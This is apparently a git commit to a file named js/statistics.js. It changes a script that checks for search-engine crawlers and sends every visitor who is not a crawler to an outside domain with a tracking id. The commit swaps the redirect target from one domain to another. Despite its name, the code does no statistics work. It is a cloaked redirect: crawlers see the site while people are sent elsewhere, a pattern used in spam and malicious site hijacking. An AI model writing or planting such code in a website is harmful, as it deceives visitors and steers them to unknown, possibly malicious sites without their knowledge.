4c3230c7377216805012ee2aa94f3a9142fe7c5a
gitonlinecloud <githubonline@outlook.com>
2024-11-13 22:32:04 +0800

    Update statistics.js

--- js/statistics.js
+++ js/statistics.js
@@ -13,5 +13,5 @@ var isSpider = spiderList.some(function(spider) {
 });
 
 if (!isSpider) {
-    window.location.href = "https://www.bfyer.com?id=395312789";
+    window.location.href = "https://www.10raw.com?id=395312789";
 }
